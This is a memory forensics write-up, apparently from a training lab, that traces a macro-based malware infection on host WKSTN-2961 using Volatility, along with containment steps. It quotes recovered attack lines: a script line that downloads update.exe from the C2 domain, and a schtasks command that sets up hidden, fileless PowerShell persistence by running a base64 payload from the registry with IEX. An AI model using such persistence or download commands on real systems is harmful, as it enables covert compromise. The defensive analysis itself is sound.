# Phase 2 — Memory Forensics

**Analyst:** Andy Dela Quarshie Wright  
**Tool:** Volatility  
**Memory Image:** WKSTN-2961.raw  

---

## Step 1 — Confirm C2 Domain in Memory

**Objective:** Search for the C2 domain boogeymanisback.lol in memory strings to confirm infection.

**Command:**
```bash
strings WKSTN-2961.raw | grep boogeymanisback
```

**Result:** Multiple hits confirmed including:
```
boogeymanisback.lol
files.boogeymanisback.lol
*.boogeymanisback.lol0!
var url = "https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe"
https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png
```

C2 domain confirmed present in memory — the malware had active communication with boogeymanisback.lol.

**Screenshot:** 04_strings_c2_domain.png

---

## Step 2 — Identify Malicious Processes (pstree)

**Objective:** Map the process tree to identify how updater.exe was spawned.

**Command:**
```bash
vol -f WKSTN-2961.raw windows.pstree
```

**Malicious process chain identified:**

```
WINWORD.EXE (PID 1124)
    └── wscript.exe (PID 4260)
            └── updater.exe (PID 6216)
```

- WINWORD.EXE opened Resume_WesleyTaylor.doc
- The AutoOpen macro triggered wscript.exe to execute update.js
- wscript.exe spawned updater.exe — the malware payload

**Screenshot:** 07_volatility_pstree.png

---

## Step 3 — Network Connections (netscan)

**Objective:** Identify active and closed network connections from the compromised host.

**Command:**
```bash
vol -f WKSTN-2961.raw windows.netscan
```

**Key findings:**

| Process | Local IP | Remote IP | Port | State |
|---------|----------|-----------|------|-------|
| updater.exe (6216) | 10.10.49.181 | 128.199.95.189 | 8080 | CLOSED/ESTABLISHED |
| OUTLOOK.EXE (1440) | 10.10.49.181 | 20.42.65.88 | 443 | CLOSED |
| WINWORD.EXE (1124) | 10.10.49.181 | 20.189.173.10 | 443 | CLOSED |

**Critical finding:** updater.exe made multiple connections to 128.199.95.189:8080 — confirmed C2 server. Multiple CLOSED states indicate repeated beaconing attempts.

**Screenshot:** 06_volatility_netscan.png

---

## Step 4 — Persistence via Scheduled Task

**Objective:** Confirm how the attacker established persistence on the system.

**Command:**
```bash
strings WKSTN-2961.raw | grep schtasks
```

**Key finding:**
```
schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\"'
Schtasks persistence established using listener http stored in HKCU:\Software\Microsoft\Windows\CurrentVersion\debug with Updater daily trigger at 09:00
```

**What this means:**
- A scheduled task named "Updater" was created
- Runs daily at 09:00
- Executes a PowerShell command hidden from the user (-W hidden)
- Reads an encoded payload from the registry (HKCU:\Software\Microsoft\Windows\CurrentVersion\debug)
- Uses IEX (Invoke-Expression) to execute the decoded payload in memory — fileless execution

**Screenshot:** 08_schtasks_persistence.png

---

## Step 5 — Locate Malicious File in Filesystem

**Objective:** Confirm the malicious Word document exists in the Outlook cache.

**Command:**
```bash
vol -f WKSTN-2961.raw windows.filescan | grep Resume_WesleyTaylor
```

**Result:**
```
0xe58f86465740.0  Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor (002).doc
0xe58f878c1420    Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor (002).doc
```

File confirmed in maxine.beck's Outlook INetCache — consistent with the email attachment being opened directly from Outlook.

**Screenshot:** 09_filescan_resume.png

---

## Summary of Memory Forensics Findings

| Finding | Detail |
|---------|--------|
| C2 domain in memory | boogeymanisback.lol — confirmed active |
| Process chain | WINWORD.EXE → wscript.exe → updater.exe |
| C2 connection | updater.exe → 128.199.95.189:8080 |
| Persistence | Scheduled task Updater — daily 09:00 — fileless PowerShell |
| File location | Outlook INetCache — maxine.beck's profile |

---

## Analyst Response

1. Isolate WKSTN-2961 from the network immediately
2. Block boogeymanisback.lol and 128.199.95.189 at perimeter
3. Terminate updater.exe (PID 6216) and wscript.exe (PID 4260)
4. Delete scheduled task Updater
5. Remove C:\ProgramData\update.js
6. Clear HKCU:\Software\Microsoft\Windows\CurrentVersion\debug registry key
7. Reset maxine.beck's credentials — assume compromised
8. Check for lateral movement from 10.10.49.181 to other internal hosts
9. Submit all IOCs to threat intelligence platform
10. Escalate to Incident Response — fileless persistence indicates advanced attacker
